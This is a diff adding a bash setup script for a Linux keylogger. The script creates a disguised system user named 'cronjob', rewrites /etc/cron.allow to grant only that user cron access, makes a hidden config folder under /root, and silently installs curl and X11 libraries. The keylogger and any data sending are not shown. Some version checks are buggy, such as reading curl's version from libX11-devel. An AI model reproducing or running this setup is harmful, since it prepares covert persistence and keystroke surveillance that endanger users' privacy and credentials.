@@ -1,0 +1,69 @@
+#!/bin/bash
+config="/root/.config/keylogger"
+
+if [ $(grep cronjob /etc/passwd | grep -c cronjob) -eq 1 ]
+then
+  echo "[+] Cronjob user already exists"
+else
+  useradd --no-create-home --no-user-group --shell /bin/bash cronjob &> /dev/null
+  echo "[+] Create user cronjob"
+fi
+
+if [ ! -f /etc/cron.allow ]; then > /etc/cron.allow; fi
+
+if [ $(grep cronjob /etc/cron.allow | grep -c cronjob) -eq 0 ]
+then
+    echo "[+] Add cronjob in cron.allow"
+    echo "cronjob" > /etc/cron.allow
+fi
+
+if [ ! -d $config ]; then
+  mkdir -p $config
+  echo "[+] Creating directory for settings in ~/.config/"
+fi
+
+echo
+echo "| Checking Packages |"
+echo
+
+if which apt &> /dev/null
+then
+   if ! dpkg -s curl &> /dev/null
+   then
+      echo "Installing curl [...]"
+      apt install -y curl &> /dev/null
+   fi
+
+curl_version=$(dpkg-query -W -f='${Version}' curl)
+echo "[+] curl $curl_version installed"
+
+  if ! dpkg -s libx11-dev &> /dev/null
+  then
+      echo "Installing librarys X11 [...]"
+      apt install -y libx11-dev &> /dev/null
+  fi
+
+libx11_version=$(dpkg-query -W -f='${Version}' libx11-dev)
+echo "[+] libx11-dev $libx11_version installed"
+
+elif which yum &> /dev/null
+then
+  if ! rpm -q curl &> /dev/null
+  then
+    echo "Installing curl [...]"
+    yum install -y curl &> /dev/null
+  fi
+
+curl_version=$(yum info libX11-devel | grep Versão | cut -d: -f2 | tr -d [[:space:]])
+echo "[+] curl $curl_version installed"
+
+if ! rpm -q libX11-devel &> /dev/null
+  then
+    echo "Installing librarys X11 [...]"
+    yum install -y libX11-devel &> /dev/null
+  fi
+
+libx11_version=$(yum info libX11-devel | grep Versão | cut -d: -f2 | tr -d [[:space:]])
+echo "[+] libX11-devel $libx11_version installed"
+
+fi
